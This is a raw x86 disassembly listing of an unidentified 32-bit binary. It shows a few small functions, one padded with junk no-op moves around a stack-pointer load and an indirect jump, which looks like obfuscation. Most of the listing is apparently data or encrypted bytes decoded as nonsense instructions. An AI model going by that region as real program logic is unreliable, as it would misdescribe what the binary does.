  401ac1:	mov    ecx,ecx
  401ac3:	mov    edx,edx
  401ac5:	mov    edx,edx
  401ac7:	mov    edx,edx
  401ac9:	mov    ecx,ecx
  401acb:	mov    esp,DWORD PTR ds:0x425200
  401ad1:	mov    ecx,ecx
  401ad3:	mov    edx,edx
  401ad5:	mov    ecx,ecx
  401ad7:	mov    edx,edx
  401ad9:	add    esp,0x4
  401adc:	mov    edx,edx
  401ade:	mov    ecx,ecx
  401ae0:	mov    edx,edx
  401ae2:	mov    edx,edx
  401ae4:	jmp    DWORD PTR ds:0x425210
  401aea:	mov    esp,ebp
  401aec:	pop    ebp
  401aed:	ret    
  401aee:	int3   
  401aef:	int3   
  401af0:	push   ebp
  401af1:	mov    ebp,esp
  401af3:	sub    esp,0x18
  401af6:	mov    eax,DWORD PTR [ebp+0x8]
  401af9:	mov    DWORD PTR [ebp-0x8],eax
  401afc:	mov    ecx,DWORD PTR [ebp+0xc]
  401aff:	mov    DWORD PTR [ebp-0x4],ecx
  401b02:	mov    DWORD PTR [ebp-0x10],0x19c
  401b09:	mov    edx,DWORD PTR [ebp-0x8]
  401b0c:	mov    DWORD PTR ds:0x425218,edx
  401b12:	mov    eax,DWORD PTR [ebp-0x4]
  401b15:	mov    ds:0x42521c,eax
  401b1a:	mov    ecx,DWORD PTR ds:0x425218
  401b20:	mov    DWORD PTR [ebp-0x14],ecx
  401b23:	mov    edx,DWORD PTR ds:0x42521c
  401b29:	mov    DWORD PTR [ebp-0xc],edx
  401b2c:	mov    eax,DWORD PTR [ebp-0xc]
  401b2f:	mov    ecx,DWORD PTR [ebp-0x14]
  401b32:	lea    edx,[ecx+eax*2]
  401b35:	mov    DWORD PTR [ebp-0x18],edx
  401b38:	mov    eax,DWORD PTR [ebp-0x18]
  401b3b:	mov    DWORD PTR [ebp-0x14],eax
  401b3e:	mov    ecx,DWORD PTR [ebp-0x14]
  401b41:	movzx  edx,WORD PTR [ecx]
  401b44:	mov    DWORD PTR [ebp-0xc],edx
  401b47:	mov    eax,DWORD PTR [ebp-0xc]
  401b4a:	mov    esp,ebp
  401b4c:	pop    ebp
  401b4d:	ret    
  401b4e:	int3   
  401b4f:	int3   
  401b50:	push   ebp
  401b51:	mov    ebp,esp
  401b53:	sub    esp,0xc
  401b56:	mov    eax,DWORD PTR [ebp+0x8]
  401b59:	mov    DWORD PTR [ebp-0x8],eax
  401b5c:	mov    ecx,DWORD PTR [ebp+0xc]
  401b5f:	mov    DWORD PTR [ebp-0xc],ecx
  401b62:	mov    DWORD PTR [ebp-0x4],0x22b
  401b69:	mov    edx,DWORD PTR [ebp-0x8]
  401b6c:	cmp    edx,DWORD PTR [ebp-0xc]
  401b6f:	jae    0x401b7f
  401b71:	mov    DWORD PTR [ebp-0x4],0x22b
  401b78:	mov    eax,DWORD PTR [ebp-0x8]
  401b7b:	jmp    0x401b89
  401b7d:	jmp    0x401b89
  401b7f:	mov    DWORD PTR [ebp-0x4],0x22b
  401b86:	mov    eax,DWORD PTR [ebp-0xc]
  401b89:	mov    esp,ebp
  401b8b:	pop    ebp
  401b8c:	ret    
  401b8d:	int3   
  401b8e:	int3   
  401b8f:	int3   
	...
  402f18:	add    BYTE PTR [edx],al
  402f1a:	add    BYTE PTR [eax],al
  402f1c:	ds pop ebx
  402f1e:	add    BYTE PTR [eax],al
  402f20:	push   esi
  402f21:	pop    ebx
  402f22:	add    BYTE PTR [eax],al
  402f24:	ret    0x9069
  402f27:	xor    dl,dl
  402f29:	imul   ebx,DWORD PTR [eax-0x5f963dce],0xa869e232
  402f33:	xor    bh,BYTE PTR [esi]
  402f35:	cmp    eax,DWORD PTR [ecx]
  402f37:	add    BYTE PTR [edx+0x5b],bl
  402f3a:	add    BYTE PTR [eax],al
  402f3c:	pop    ebp
  402f3d:	mov    di,WORD PTR ds:0x3d9a66ce
  402f44:	shl    DWORD PTR [esi-0x58],1
  402f47:	cmp    eax,0x3dd36698
  402f4c:	and    BYTE PTR [esi-0x18],0x3d
  402f50:	inc    edx
  402f51:	gs sub eax,0x5165053e
  402f57:	ds out 0x64,eax
  402f5a:	fnstsw WORD PTR [esi]
  402f5c:	pop    edx
  402f5d:	add    BYTE PTR fs:[eax],al
  402f60:	sub    eax,DWORD PTR ds:[ecx]
  402f63:	add    BYTE PTR [esi],dl
  402f65:	pop    ebx
  402f66:	add    BYTE PTR [eax],al
  402f68:	add    DWORD PTR [ebx-0x33],ebp
  402f6b:	xor    BYTE PTR [ebx],cl
  402f6d:	imul   eax,DWORD PTR [ecx+esi*1],0x4b
  402f71:	push   0x27
  402f73:	xor    eax,edx
  402f75:	imul   eax,ebx,0xe969e531
  402f7b:	xor    DWORD PTR [ecx],edx
  402f7d:	push   0xffffffff
  402f7f:	xor    DWORD PTR [eax],eax
	...
  402fa9:	add    BYTE PTR [edx+0x69],cl
  402fac:	adc    dh,BYTE PTR [edx]
  402fae:	sbb    BYTE PTR [ecx+0x31],ch
  402fb1:	xor    ah,BYTE PTR [edi]
  402fb3:	imul   edi,DWORD PTR [edi],0x58697b32
  402fb9:	xor    bh,bh
  402fbb:	push   0x67b832c7
  402fc0:	mov    esi,DWORD PTR [ebx]
  402fc2:	stos   DWORD PTR es:[edi],eax
  402fc3:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  402fc5:	xor    ecx,DWORD PTR [esi-0x5dcc3299]
  402fcb:	addr16 jmp 0xf834:0x216f3c33
  402fd3:	outs   dx,BYTE PTR ds:[esi]
  402fd4:	push   edi
  402fd5:	xor    al,0x2
  402fd7:	outs   dx,DWORD PTR ds:[esi]
  402fd8:	arpl   WORD PTR [edi+edx*1],si
  402fdb:	outs   dx,DWORD PTR ds:[esi]
  402fdc:	xor    BYTE PTR [esi+eax*8],0x6e
  402fe0:	xchg   ecx,eax
  402fe1:	xor    al,0xb1
  402fe3:	outs   dx,BYTE PTR ds:[esi]
  402fe4:	sahf   
  402fe5:	xor    al,0xd3
  402fe7:	outs   dx,BYTE PTR ds:[esi]
  402fe8:	mov    ebp,0xd46e7c34
  402fed:	xor    al,0x93
  402fef:	outs   dx,BYTE PTR ds:[esi]
  402ff0:	out    0x34,eax
  402ff2:	jo     0x403062
  402ff4:	add    dh,BYTE PTR ds:0x35486e4e
  402ffa:	or     BYTE PTR [esi+0x54],ch
  402ffd:	xor    eax,0x356a6ddb
  403002:	mov    esp,0x7635be6d
  403007:	ins    DWORD PTR es:[edi],dx
  403008:	aad    0x35
  40300a:	pop    ds
  40300b:	imul   ebp,ebx,0x35
	...
  403035:	add    BYTE PTR [eax],al
  403037:	add    BYTE PTR [edx],ch
  403039:	imul   edi,esi,0xe693735
  40303f:	ss dec edx
  403041:	imul   ebx,DWORD PTR ds:0x34696936,0x3f695436
  40304b:	sub    DWORD PTR ss:[ecx+0x49],0x36
  403050:	jo     0x4030bb
  403052:	push   esp
  403053:	ss pop esp
  403055:	imul   ebp,DWORD PTR [eax+0x36],0x36726963
  40305c:	mov    ecx,0xf8369a69
  403061:	imul   ecx,esp,0xdc69ec36
  403067:	cmp    BYTE PTR ss:[edx+0x2b],ch
  40306b:	aaa    
  40306c:	push   es
  40306d:	push   0x4c
  40306f:	aaa    
  403070:	push   0x2737636a
  403075:	push   0x71
  403077:	aaa    
  403078:	aaa    
  403079:	push   0xffffff84
  40307b:	aaa    
  40307c:	mov    edx,0xdc379d6a
  403081:	push   0xffffffb1
  403083:	aaa    
  403084:	sub    DWORD PTR [edx-0x32],0x37
  403088:	push   0x3e37e56a
  40308d:	pop    ebx
  40308e:	add    BYTE PTR [eax],al
  403090:	ds pop ebx
  403092:	add    BYTE PTR [eax],al
  403094:	ds pop ebx
  403096:	add    BYTE PTR [eax],al
  403098:	ds pop ebx
	...
  4030c6:	ds pop ebx
  4030c8:	add    BYTE PTR [eax],al
  4030ca:	ds pop ebx
  4030cc:	add    BYTE PTR [eax],al
  4030ce:	ds pop ebx
  4030d0:	add    BYTE PTR [eax],al
  4030d2:	ds pop ebx
  4030d4:	add    BYTE PTR [eax],al
  4030d6:	ds pop ebx
  4030d8:	add    BYTE PTR [eax],al
  4030da:	ds pop ebx
  4030dc:	add    BYTE PTR [eax],al
  4030de:	ds pop ebx
  4030e0:	add    BYTE PTR [eax],al
  4030e2:	ds pop ebx
  4030e4:	add    BYTE PTR [eax],al
  4030e6:	ds pop ebx
  4030e8:	add    BYTE PTR [eax],al
  4030ea:	ds pop ebx
  4030ec:	add    BYTE PTR [eax],al
  4030ee:	ds pop ebx
  4030f0:	add    BYTE PTR [eax],al
  4030f2:	ds pop ebx
  4030f4:	add    BYTE PTR [eax],al
  4030f6:	ds pop ebx
  4030f8:	add    BYTE PTR [eax],al
  4030fa:	ds pop ebx
  4030fc:	add    BYTE PTR [eax],al
  4030fe:	ds pop ebx
  403100:	add    BYTE PTR [eax],al
  403102:	ds pop ebx
  403104:	add    BYTE PTR [eax],al
  403106:	ds pop ebx
  403108:	add    BYTE PTR [eax],al
  40310a:	ds pop ebx
  40310c:	add    BYTE PTR [eax],al
  40310e:	ds pop ebx
  403110:	add    BYTE PTR [eax],al
  403112:	ds pop ebx
  403114:	add    BYTE PTR [eax],al
  403116:	ds pop ebx
  403118:	add    BYTE PTR [eax],al
  40311a:	ds pop ebx
  40311c:	add    BYTE PTR [eax],al
  40311e:	ds pop ebx
  403120:	add    BYTE PTR [eax],al
  403122:	ds pop ebx
  403124:	add    BYTE PTR [eax],al
  403126:	ds pop ebx
	...
  403154:	ds pop ebx
  403156:	add    BYTE PTR [eax],al
  403158:	ds pop ebx
  40315a:	add    BYTE PTR [eax],al
  40315c:	ds pop ebx
  40315e:	add    BYTE PTR [eax],al
  403160:	ds pop ebx
  403162:	add    BYTE PTR [eax],al
  403164:	ds pop ebx
  403166:	add    BYTE PTR [eax],al
  403168:	ds pop ebx
  40316a:	add    BYTE PTR [eax],al
  40316c:	ds pop ebx
  40316e:	add    BYTE PTR [eax],al
  403170:	ds pop ebx
  403172:	add    BYTE PTR [eax],al
  403174:	ds pop ebx
  403176:	add    BYTE PTR [eax],al
  403178:	ds pop ebx
  40317a:	add    BYTE PTR [eax],al
  40317c:	ds pop ebx
  40317e:	add    BYTE PTR [eax],al
  403180:	ds pop ebx
  403182:	add    BYTE PTR [eax],al
  403184:	ds pop ebx
  403186:	add    BYTE PTR [eax],al
  403188:	ds pop ebx
  40318a:	add    BYTE PTR [eax],al
  40318c:	ds pop ebx
  40318e:	add    BYTE PTR [eax],al
  403190:	ds pop ebx
  403192:	add    BYTE PTR [eax],al
  403194:	ds pop ebx
  403196:	add    BYTE PTR [eax],al
  403198:	ds pop ebx
  40319a:	add    BYTE PTR [eax],al
  40319c:	ds pop ebx
  40319e:	add    BYTE PTR [eax],al
  4031a0:	ds pop ebx
  4031a2:	add    BYTE PTR [eax],al
  4031a4:	ds pop ebx
  4031a6:	add    BYTE PTR [eax],al
  4031a8:	ds pop ebx
  4031aa:	add    BYTE PTR [eax],al
  4031ac:	ds pop ebx
  4031ae:	add    BYTE PTR [eax],al
  4031b0:	ds pop ebx
  4031b2:	add    BYTE PTR [eax],al
  4031b4:	ds pop ebx
	...
  4031e2:	ds pop ebx
  4031e4:	add    BYTE PTR [eax],al
  4031e6:	ds pop ebx
  4031e8:	add    BYTE PTR [eax],al
  4031ea:	ds pop ebx
  4031ec:	add    BYTE PTR [eax],al
  4031ee:	add    BYTE PTR [edi+0x1],dh
  4031f1:	add    BYTE PTR [esi],bh
  4031f3:	and    al,BYTE PTR [ecx+0x0]
  4031f6:	add    DWORD PTR [esi],edi
  4031f8:	je     0x40324a
  4031fa:	sub    al,0x34
  4031fc:	arpl   WORD PTR [ecx+0x22],ax
  4031ff:	aas    
  403200:	jb     0x403267
  403202:	sub    eax,0xa000028
  403207:	xor    al,0x61
  403209:	add    dh,BYTE PTR fs:[edx]
  40320c:	bound  esi,QWORD PTR [edx+0x1f]
  40320f:	sub    DWORD PTR [ecx+0x45],edi
  403212:	push   es
  403213:	sbb    al,BYTE PTR [eax]
  403215:	add    BYTE PTR [edx],cl
  403217:	xor    al,0x61
  403219:	add    dh,BYTE PTR fs:[edx]
  40321c:	bound  esi,QWORD PTR [edx-0x21]
  40321f:	sub    BYTE PTR [ecx+0x45],bh
  403222:	out    0xb,al
  403224:	add    BYTE PTR [eax],al
  403226:	add    DWORD PTR [esi],edi
  403228:	je     0x403277
  40322a:	loope  0x40326a
  40322c:	jne    0x40329a
  40322e:	jecxz  0x403242
  403230:	popa   
  403231:	outs   dx,BYTE PTR ds:[esi]
  403232:	fidiv  DWORD PTR [esi]
  403234:	gs inc ecx
  403236:	ds pop ebx
  403238:	add    BYTE PTR [eax],al
  40323a:	jge    0x403265
  40323c:	gs popa 
  40323e:	mov    dl,0x3e
  403240:	inc    esi
  403241:	imul   edx,DWORD PTR [edx-0x55ffbec2],0x9d727428
  40324b:	cmp    dh,BYTE PTR [ecx+eax*2+0x3e]
  40324f:	pop    ebx
  403250:	add    BYTE PTR [eax],al
  403252:	jns    0x403292
  403254:	je     0x4032ad
	...
  40327e:	add    BYTE PTR [eax],al
  403280:	addr16 xor eax,0x28696f64
  403286:	inc    esp
  403287:	imul   ebp,DWORD PTR [esi+edi*1+0x63],0x79295174
  40328f:	inc    ecx
  403290:	ds pop ebx
  403292:	add    BYTE PTR [eax],al
  403294:	jns    0x4032d4
  403296:	je     0x4032e5
  403298:	pop    ecx
  403299:	aas    
  40329a:	jne    0x403308
  40329c:	pop    ebx
  40329d:	adc    esp,DWORD PTR [ecx+0x6e]
  4032a0:	and    dh,BYTE PTR [edi]
  4032a2:	gs push edi
  4032a4:	ds pop ebx
  4032a6:	add    BYTE PTR [eax],al
  4032a8:	inc    edx
  4032a9:	pop    ecx
  4032aa:	inc    eax
  4032ab:	add    BYTE PTR [edx+0x59],cl
  4032ae:	inc    eax
  4032af:	add    BYTE PTR [edx+0x59],ah
  4032b2:	inc    eax
  4032b3:	add    BYTE PTR [edx+0x59],cl
  4032b6:	inc    eax
  4032b7:	add    dh,dh
  4032b9:	pop    eax
  4032ba:	inc    eax
  4032bb:	add    dl,ch
  4032bd:	pop    eax
  4032be:	inc    eax
  4032bf:	add    dh,bl
  4032c1:	pop    eax
  4032c2:	inc    eax
  4032c3:	add    dh,dh
  4032c5:	pop    eax
  4032c6:	inc    eax
  4032c7:	add    BYTE PTR [ecx],al
  4032c9:	ds je  0x40331c
  4032cc:	in     al,dx
  4032cd:	xor    esp,DWORD PTR [ebx+0x41]
  4032d0:	loop   0x403310
  4032d2:	jb     0x403339
  4032d4:	int    0x27
  4032d6:	add    BYTE PTR [eax],al
  4032d8:	cli    
  4032d9:	xor    esp,DWORD PTR [ecx+0x64]
  4032dc:	repnz xor DWORD PTR [edx+0x72],esp
  4032e0:	lahf   
  4032e1:	sub    eax,0x4579
	...
  40330e:	mov    dh,0x1c
  403310:	add    BYTE PTR [eax],al
  403312:	xchg   ebp,eax
  403313:	cmp    BYTE PTR [edx+0x6e],dh
  403316:	fwait
  403317:	das    
  403318:	xor    esi,DWORD PTR [edx]
  40331a:	push   0x3e6c6c37
  40331f:	pop    ebx
  403320:	add    BYTE PTR [eax],al
  403322:	fwait
  403323:	cs jbe 0x403389
  403326:	mov    WORD PTR [edi],fs
  403328:	cs fs push 0x2f
  40332c:	add    BYTE PTR [eax],al
  40332e:	arpl   WORD PTR [eax],di
  403330:	ins    DWORD PTR es:[edi],dx
  403331:	jae    0x403396
  403333:	daa    
  403334:	add    BYTE PTR [eax],al
  403336:	push   ebx
  403337:	cs jbe 0x40339d
  40333a:	dec    esp
  40333b:	daa    
  40333c:	cs bound ebp,QWORD PTR fs:[edi]
  403340:	add    BYTE PTR [eax],al
  403342:	pop    ebx
  403343:	cmp    BYTE PTR [ebp+0x63],ch
  403346:	dec    esi
  403347:	and    al,0x0
  403349:	add    BYTE PTR [eax],dl
  40334b:	xor    al,0x72
  40334d:	je     0x40337a
  40334f:	cmp    al,0x6c
  403351:	inc    ecx
  403352:	sbb    ch,BYTE PTR [edi]
  403354:	outs   dx,DWORD PTR ds:[esi]
  403355:	arpl   WORD PTR [esi],di
  403357:	pop    ebx
  403358:	add    BYTE PTR [eax],al
  40335a:	lock xor esi,DWORD PTR [edx+0x74]
  40335e:	or     edi,DWORD PTR [esp+ebp*2]
  403361:	inc    ecx
  403362:	sbb    ch,BYTE PTR [edi]
  403364:	outs   dx,DWORD PTR ds:[esi]
  403365:	arpl   WORD PTR [esi],di
  403367:	pop    ebx
  403368:	add    BYTE PTR [eax],al
  40336a:	adc    esi,DWORD PTR [ecx]
  40336c:	ins    DWORD PTR es:[edi],dx
  40336d:	popa   
  40336e:	out    dx,al
  40336f:	or     BYTE PTR [ecx+0x65],ch
	...
  40339a:	add    BYTE PTR [eax],al
  40339c:	icebp  
  40339d:	adc    DWORD PTR [esi+0x46],esp
  4033a0:	xlat   BYTE PTR ds:[ebx]
  4033a1:	cs gs add al,dh
  4033a5:	xor    esi,DWORD PTR [edx+0x74]
  4033a8:	retf   
  4033a9:	cmp    ebp,DWORD PTR [eax+edx*2-0x34]
  4033ad:	xor    DWORD PTR [ebp+eiz*2-0x23],esi
  4033b1:	add    BYTE PTR es:[eax],al
  4033b4:	xchg   BYTE PTR [eax],bh
  4033b6:	popa   
  4033b7:	jo     0x403438
  4033b9:	das    
  4033ba:	ins    BYTE PTR es:[edi],dx
  4033bb:	outs   dx,DWORD PTR ds:[esi]
  4033bc:	popf   
  4033bd:	pop    ebx
  4033be:	add    BYTE PTR [eax],al
  4033c0:	xchg   ebp,eax
  4033c1:	cmp    BYTE PTR [edx+0x6e],dh
  4033c4:	mov    ds:0x6032332f,eax
  4033c9:	aaa    
  4033ca:	ins    BYTE PTR es:[edi],dx
  4033cb:	ins    BYTE PTR es:[edi],dx
  4033cc:	ds pop ebx
  4033ce:	add    BYTE PTR [eax],al
  4033d0:	jns    0x40340a
  4033d2:	je     0x403424
  4033d4:	ins    BYTE PTR es:[edi],dx
  4033d5:	xor    ah,BYTE PTR [ebx+0x65]
  4033d8:	ins    DWORD PTR es:[edi],dx
  4033d9:	cs dec eax
  4033db:	gs pop edi
  4033dd:	sub    eax,DWORD PTR [eax]
  4033df:	add    BYTE PTR [esi],bh
  4033e1:	pop    ebx
  4033e2:	add    WORD PTR [esi],di
  4033e5:	neg    DWORD PTR [ecx-0x70]
  4033e8:	ds mov ch,0x3
  4033eb:	add    BYTE PTR [esi],bh
  4033ed:	mov    al,0x3
  4033ef:	add    BYTE PTR [esi],bh
  4033f1:	mov    eax,ds:0x6c3e00fb
  4033f6:	add    eax,DWORD PTR [eax]
  4033f8:	ds mov ah,0x3
  4033fb:	add    BYTE PTR [esi],bh
  4033fd:	je     0x403403
	...
  403427:	add    BYTE PTR [eax],al
  403429:	add    BYTE PTR [esi],bh
  40342b:	mov    ah,0x3
  40342d:	add    BYTE PTR [esi],bh
  40342f:	mov    ah,0x3
  403431:	add    BYTE PTR [esi],bh
  403433:	mov    ah,0x3
  403435:	add    BYTE PTR [esi],bh
  403437:	mov    ah,0x3
  403439:	add    BYTE PTR [esi],bh
  40343b:	mov    ah,0x3
  40343d:	add    BYTE PTR [esi],bh
  40343f:	mov    ah,0x3
  403441:	add    BYTE PTR [esi],bh
  403443:	mov    ah,0x3
  403445:	add    BYTE PTR [esi],bh
  403447:	mov    ah,0x3
  403449:	add    BYTE PTR [esi],bh
  40344b:	xor    al,0x4
  40344d:	add    BYTE PTR [esi],bh
  40344f:	mov    edx,0xb440ba1a
  403454:	scas   eax,DWORD PTR es:[edi]
  403455:	or     DWORD PTR [ebx-0x6e],edi
  403458:	mov    ebx,0x25eef201
  40345d:	push   esp
  40345e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40345f:	pop    ebx
  403460:	ja     0x403482
  403462:	scas   al,BYTE PTR es:[edi]
  403463:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403464:	push   0x67
  403466:	lods   al,BYTE PTR ds:[esi]
  403467:	xchg   ebx,eax
  403468:	push   0x69939d20
  40346d:	outs   dx,BYTE PTR ds:[esi]
  40346e:	test   eax,0x9b62237e
  403473:	push   edx
  403474:	jbe    0x4034eb
  403476:	cwde   
  403477:	push   edx
  403478:	ins    DWORD PTR es:[edi],dx
  403479:	outs   dx,BYTE PTR ds:[esi]
  40347a:	pop    esi
  40347b:	test   BYTE PTR [edx+0x53],0x1e
  40347f:	xchg   edi,eax
  403480:	push   0x64
  403482:	pop    ebx
  403483:	mov    al,ds:0x5b340d08
  403488:	int    0x3
  40348a:	ds pop ebx
  40348c:	jmp    0x403494
	...
  4034b5:	add    BYTE PTR [eax],al
  4034b7:	add    BYTE PTR [esi],bh
  4034b9:	pop    ebx
  4034ba:	mov    ecx,0x9d5b3e40
  4034bf:	add    al,0x3d
  4034c1:	pop    ebx
  4034c2:	inc    eax
  4034c3:	adc    eax,0x3e910c3
  4034c8:	ds pop ebx
  4034ca:	jmp    0x99b72d2
  4034cf:	add    al,0x39
  4034d1:	pop    edx
  4034d2:	repnz add al,0x3c
  4034d5:	ins    DWORD PTR es:[edi],dx
  4034d6:	jmp    0xe99b73f6
  4034db:	push   ebp
  4034dc:	ds pop ebx
  4034de:	jmp    0x109b72e6
  4034e3:	pop    es
  4034e4:	aas    
  4034e5:	pop    ebx
  4034e6:	jmp    0xe99b72fe
  4034eb:	xor    edi,DWORD PTR [edi]
  4034ed:	pop    ebx
  4034ee:	jmp    0xe99b32f6
  4034f3:	adc    edi,DWORD PTR [esi]
  4034f5:	pop    ebx
  4034f6:	jmp    0xed9b7300
  4034fb:	add    edi,DWORD PTR [esi]
  4034fd:	pop    ebx
  4034fe:	jmp    0xed9b7306
  403503:	add    edi,DWORD PTR [esi]
  403505:	pop    ebx
  403506:	jmp    0xe99b730e
  40350b:	xchg   ebx,eax
  40350c:	aas    
  40350d:	pop    ebx
  40350e:	jmp    0xe19b7318
  403513:	xor    al,0x3c
  403515:	pop    ebx
  403516:	jmp    0x40351b
  403518:	ds pop ebx
  40351a:	jmp    0x403522
	...
  403543:	add    BYTE PTR [eax],al
  403545:	add    BYTE PTR [esi],ch
  403547:	pop    ebx
  403548:	jmp    0xe99b7360
  40354d:	add    ebp,DWORD PTR [esi]
  40354f:	pop    ebx
  403550:	jmp    0x9b7368
  403555:	jmp    0xd9409097
  40355a:	cmp    eax,0x3de9005b
  40355f:	pop    ebx
  403560:	add    cl,ch
  403562:	cmp    eax,0x5711005b
  403567:	pop    edx
  403568:	add    BYTE PTR [ecx],ah
  40356a:	cmp    eax,0x3de9005b
  40356f:	pop    ebx
  403570:	add    cl,ch
  403572:	cmp    eax,0x3de9005b
  403577:	pop    ebx
  403578:	add    cl,ch
  40357a:	cmp    eax,0x3de9005b
  40357f:	pop    ebx
  403580:	add    cl,ch
  403582:	cmp    eax,0x3de9005b
  403587:	pop    ebx
  403588:	add    cl,ch
  40358a:	cmp    eax,0x3de9005b
  40358f:	pop    ebx
  403590:	add    cl,ch
  403592:	cmp    eax,0x3de9005b
  403597:	pop    ebx
  403598:	add    cl,ch
  40359a:	cmp    eax,0x3de9005b
  40359f:	pop    ebx
  4035a0:	add    cl,ch
  4035a2:	cmp    eax,0x3de9005b
  4035a7:	pop    ebx
  4035a8:	add    cl,ch
	...
  4035d2:	add    BYTE PTR [eax],al
  4035d4:	cmp    eax,0x3de9005b
  4035d9:	pop    ebx
  4035da:	add    cl,ch
  4035dc:	cmp    eax,0x3de9005b
  4035e1:	pop    ebx
  4035e2:	add    cl,ch
  4035e4:	cmp    eax,0xbcb9005b
  4035e9:	pop    esp
  4035ea:	add    BYTE PTR [ecx+0x3d],bh
  4035ed:	pop    ebx
  4035ee:	add    cl,ch
  4035f0:	cmp    eax,0x3de9005b
  4035f5:	pop    ebx
  4035f6:	add    BYTE PTR [eax],al
  4035f8:	pop    ss
  4035f9:	pop    ebx
  4035fa:	add    BYTE PTR [eax],al
  4035fc:	out    0x5a,eax
  4035fe:	add    BYTE PTR [eax],al
  403600:	out    0x5a,eax
  403602:	add    BYTE PTR [eax],al
  403604:	xlat   BYTE PTR ds:[ebx]
  403605:	pop    edx
  403606:	add    BYTE PTR [eax],al
  403608:	or     DWORD PTR [edi],ebp
  40360a:	gs js  0x4035c0
  40360d:	pop    edx
  40360e:	add    BYTE PTR [eax],al
  403610:	pushf  
  403611:	dec    ebx
  403612:	add    DWORD PTR [eax],eax
  403614:	xlat   BYTE PTR ds:[ebx]
  403615:	dec    edx
  403616:	add    BYTE PTR [eax],al
  403618:	xlat   BYTE PTR ds:[ebx]
  403619:	inc    edx
  40361a:	add    DWORD PTR [eax],eax
  40361c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40361d:	pop    eax
  40361e:	add    BYTE PTR [eax],al
  403620:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403621:	pop    edx
  403622:	add    BYTE PTR [eax],al
  403624:	xchg   edi,eax
  403625:	pop    edx
  403626:	add    BYTE PTR [eax],al
  403628:	xchg   edi,eax
  403629:	pop    edx
  40362a:	add    BYTE PTR [eax],al
  40362c:	inc    edi
  40362d:	push   edi
  40362e:	add    BYTE PTR [eax+0x39],ah
  403631:	and    eax,0x39f36164
	...
  403662:	xchg   edi,eax
  403663:	pop    ecx
  403664:	add    BYTE PTR [eax],al
  403666:	addr16 push 0x1
  403669:	add    BYTE PTR [edi+0x58],ah
  40366c:	add    BYTE PTR [eax],al
  40366e:	push   edi
  40366f:	inc    eax
  403670:	add    DWORD PTR [eax],eax
  403672:	push   edi
  403673:	pop    edx
  403674:	add    BYTE PTR [eax],al
  403676:	addr16 pop edx
  403678:	add    BYTE PTR [eax],al
  40367a:	addr16 pop edx
  40367c:	add    BYTE PTR [eax],al
  40367e:	pop    ss
  40367f:	push   edi
  403680:	add    BYTE PTR [eax+0x69],al
  403683:	(bad)  
  403684:	pusha  
  403685:	je     0x4036cd
  403687:	push   edi
  403688:	add    BYTE PTR [eax],al
  40368a:	jg     0x4036a0
  40368c:	add    BYTE PTR [eax],al
  40368e:	pop    ss
  40368f:	sbb    al,BYTE PTR [ecx]
  403691:	add    BYTE PTR [edi],dl
  403693:	adc    BYTE PTR [eax],al
  403695:	add    BYTE PTR [edi],ah
  403697:	inc    esi
  403698:	add    DWORD PTR [eax],eax
  40369a:	ds mov ah,0x3
  40369d:	add    BYTE PTR [esi],bh
  40369f:	mov    ah,0x3
  4036a1:	add    BYTE PTR [esi],bh
  4036a3:	mov    ah,0x3
  4036a5:	add    BYTE PTR [esi],bh
  4036a7:	hlt    
  4036a8:	add    eax,DWORD PTR [eax]
  4036aa:	(bad)  
  4036ab:	mov    bl,0x3
  4036ad:	add    BYTE PTR [esi],bh
  4036af:	mov    ah,0x3
  4036b1:	add    BYTE PTR [esi],bh
  4036b3:	mov    ah,0x3
  4036b5:	add    BYTE PTR [esi],bh
  4036b7:	mov    ah,0x3
  4036b9:	add    BYTE PTR [esi],bh
  4036bb:	fisttp WORD PTR [esp+ebp*8+0xf6bec6e]
  4036c2:	cs hlt 
  4036c4:	add    edi,eax
	...
  4036ee:	add    BYTE PTR [eax],al
  4036f0:	sub    al,0xb3
  4036f2:	(bad)  
  4036f3:	push   DWORD PTR [ecx+0x3f6a0b1e]
  4036f9:	fiadd  DWORD PTR [ebx]
  4036fb:	call   0x44b725
  403700:	xchg   ecx,esi
  403702:	add    BYTE PTR [eax],al
  403704:	jmp    0x40373e
  403706:	call   0x265c1d5b
  40370b:	adc    dh,bh
  40370d:	mov    bl,0xfb
  40370f:	jb     0x403750
  403711:	icebp  
  403712:	test   DWORD PTR [ebx+0x7403bbf3],0x8513935
  40371c:	mov    ch,0xa1
  40371e:	div    BYTE PTR [ebp+0x46]
  403721:	mov    ebp,0xf1870852
  403726:	add    BYTE PTR [eax],al
  403728:	repz cmp al,ch
  40372b:	cmp    DWORD PTR [edx-0x25],0x54
  40372f:	pop    eax
  403730:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403731:	inc    edi
  403732:	adc    al,0x40
  403734:	sub    dh,BYTE PTR ds:[edx+0x1]
  403738:	std    
  403739:	sub    eax,0x5b3275f7
  40373e:	jbe    0x403781
  403740:	push   ss
  403741:	xchg   ebp,eax
  403742:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403743:	idiv   DWORD PTR [esi]
  403745:	pop    ebx
  403746:	jmp    0xe146ec4e
  40374b:	mov    ch,BYTE PTR [ecx+esi*1]
  40374e:	jmp    0x3e8bab49
  403753:	jno    0x403755
	...
  40377d:	add    dl,dh
  40377f:	pushf  
  403780:	mov    esp,0xe126e9fb
  403785:	test   BYTE PTR [edi+eax*2+0x5b4ac230],0xb4
  40378d:	mov    ah,dl
  40378f:	fsubr  DWORD PTR ds:0x81036efc
  403795:	test   DWORD PTR [esi],ebp
  403797:	sbb    ebp,ecx
  403799:	sti    
  40379a:	sub    al,0x5a
  40379c:	sub    dh,bh
  40379e:	jns    0x4037b6
  4037a0:	icebp  
  4037a1:	add    edi,DWORD PTR [esi]
  4037a3:	pop    ebx
  4037a4:	jmp    0xe9df3367
  4037a9:	add    edi,DWORD PTR [esi]
  4037ab:	pop    ebx
  4037ac:	jb     0x4037fe
  4037ae:	inc    esi
  4037af:	sar    bl,1
  4037b1:	mov    BYTE PTR [ebx],al
  4037b3:	mov    ds:0x9c3c6a39,eax
  4037b8:	cmp    al,0xf8
  4037ba:	jns    0x4037e2
  4037bc:	shl    esi,0xeb
  4037bf:	push   edx
  4037c0:	mov    dh,0x51
  4037c2:	push   edx
  4037c3:	shl    BYTE PTR [esp+edi*8],1
  4037c6:	ja     0x403761
  4037c8:	in     eax,dx
  4037c9:	add    esi,ebx
  4037cb:	iret   
